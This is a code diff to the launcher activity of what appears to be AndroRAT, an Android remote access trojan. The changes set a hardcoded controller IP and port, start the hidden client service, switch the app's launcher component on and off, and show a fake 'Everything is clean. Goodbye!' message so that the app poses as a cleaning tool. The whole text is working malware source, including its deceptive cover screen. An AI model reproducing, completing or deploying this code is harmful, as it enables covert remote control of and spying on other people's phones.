@@ -4,8 +4,10 @@ import my.app.client.R;
 import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.PowerManager;
@@ -19,56 +21,34 @@ import android.widget.EditText;
 import android.widget.ProgressBar;
 import android.widget.Toast;
 
-public class LauncherActivity extends Activity {
+import static android.R.attr.enabled;
 
+public class LauncherActivity extends Activity {
+	private static final String TAG = "AndroRAT";
 	Intent Client, ClientAlt;
 	Button btnStart, btnStop;
 	EditText ipfield, portfield;
-	String myIp = ""; //insert ip.
-	int myPort = 3000; //remove quotes and insert port.
+	String myIp = "192.168.0.12"; //insert ip.
+	int myPort = 9999; //remove quotes and insert port.
+	Context ctx = this;
 
 	@Override
 	public void onStart() {
 		super.onStart();
-		onResume();
+
 	}
 
 	@Override
 	public void onResume() {
 		super.onResume();
-		setContentView(R.layout.main);
 
-		Client = new Intent(this, Client.class);
-		Client.setAction(LauncherActivity.class.getName());
-
-		btnStart = (Button) findViewById(R.id.buttonstart);
-		btnStop = (Button) findViewById(R.id.buttonstop);
-		ipfield = (EditText) findViewById(R.id.ipfield);
-		portfield = (EditText) findViewById(R.id.portfield);
-
-		if (myIp == "") {
-			ipfield.setText("");//insert ip
-			portfield.setText("");//insert port
-			Client.putExtra("IP", ipfield.getText().toString());
-			Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()));
-		} else {
-			ipfield.setText(myIp);
-			portfield.setText(String.valueOf(myPort));
-			Client.putExtra("IP", myIp);
-			Client.putExtra("PORT", myPort);
-		}
-
-		startService(Client);
-		btnStart.setEnabled(false);
-		btnStop.setEnabled(true);
 	}
 
 	public void onPause() {
 		super.onPause();
-		Log.i("pausa", "hey");
+		Log.i(TAG, "hey");
 		moveTaskToBack(false);
 
-		onResume();
 	}
 
 	@Override
@@ -76,37 +56,31 @@ public class LauncherActivity extends Activity {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.main);
 
-		Client = new Intent(this, Client.class);
-		Client.setAction(LauncherActivity.class.getName());
-
 		btnStart = (Button) findViewById(R.id.buttonstart);
 		btnStop = (Button) findViewById(R.id.buttonstop);
 		ipfield = (EditText) findViewById(R.id.ipfield);
 		portfield = (EditText) findViewById(R.id.portfield);
 
-		if (myIp == "") {
-			ipfield.setText(""); //insert ip
-			portfield.setText(""); //insert port
-			Client.putExtra("IP", ipfield.getText().toString());
-			Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()));
-		} else {
-			ipfield.setText(myIp);
-			portfield.setText(String.valueOf(myPort));
-			Client.putExtra("IP", myIp);
-			Client.putExtra("PORT", myPort);
-		}
-
-		startService(Client);
-		btnStart.setEnabled(false);
-		btnStop.setEnabled(true);
+		btnStart.setEnabled(true);
+		btnStop.setEnabled(false);
 	}
 
 	public void onClickBtn(View v) throws InterruptedException {
-		hideApplication();
+		btnStart.setEnabled(false);
+		btnStop.setEnabled(true);
+
+		Client = new Intent(this, Client.class);
+		Client.setAction(LauncherActivity.class.getName());
+
+		Client.putExtra("IP", ipfield.getText().toString());
+		Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()));
+
+		startService(Client);
+		setComponentState(ctx,"my.app.client","LauncherActivity", true);
 		ProgressBar pb = (ProgressBar) findViewById(R.id.progressBar1);
-		pb.setVisibility(v.VISIBLE);
+		pb.setVisibility(View.VISIBLE);
 		Thread.sleep(5000);
-		Toast.makeText(getApplicationContext(), "Pulizia completata! Arrivederci...", Toast.LENGTH_LONG).show();
+		Toast.makeText(getApplicationContext(), "Everything is clean. Goodbye!...", Toast.LENGTH_LONG).show();
 		onBackPressed();
 	}
 
@@ -116,5 +90,26 @@ public class LauncherActivity extends Activity {
 		pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
 				PackageManager.DONT_KILL_APP);
 
+	}
+
+	public void onStopClick(View v) throws InterruptedException {
+		btnStart.setEnabled(true);
+		btnStop.setEnabled(false);
+
+		stopService(Client);
+		Client = null;
+		setComponentState(ctx,"my.app.client","LauncherActivity", false);
+		Toast.makeText(getApplicationContext(), "Everything is clean. Goodbye!...", Toast.LENGTH_LONG).show();
+
+	}
+
+	public static void setComponentState(Context context, String packageName , String componentClassName,boolean enabled)
+	{
+		PackageManager pm  = context.getApplicationContext().getPackageManager();
+		ComponentName componentName = new ComponentName(packageName, componentClassName);
+		int state = enabled ?  PackageManager.COMPONENT_ENABLED_STATE_ENABLED :  PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+		pm.setComponentEnabledSetting(componentName,
+				state,
+				PackageManager.DONT_KILL_APP);
 	}
 }
